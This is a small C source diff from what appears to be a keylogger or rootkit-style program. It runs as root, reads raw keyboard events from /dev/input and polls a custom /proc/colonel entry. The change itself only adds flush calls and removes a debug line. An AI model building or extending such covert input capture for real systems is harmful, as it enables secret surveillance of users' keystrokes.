@@ -73,6 +73,7 @@ int main(void) {
 	
 	if (!ftty) {
 		fprintf(fp, "ERROR: /proc/colonel not found -- %s", ctime(&curtime));
+        fflush(fp);
 		return 1;
 	}
 	// findev = open('/proc/bus/input/devices', O_RDONLY);
@@ -81,11 +82,11 @@ int main(void) {
 */	
 	if (geteuid() != 0) {									                 /* check if user is root */
 		fprintf(fp, "ERROR: user not root -- %s", ctime(&curtime));
+        fflush(fp);
 		return 1;
 	}
 
-	while(1) {
-        fprintf(fp, "Top of while (no if), ftty open and reading -- listening: %d, toggle: %s", listening, toggle);				
+	while(1) {				
 		fflush(fp);
 		read(fd, &ev, sizeof(struct input_event));			                  /* read from /dev/input/eventX */
 		ftty = open("/proc/colonel", O_RDONLY);                               /* read from /proc/colonel */
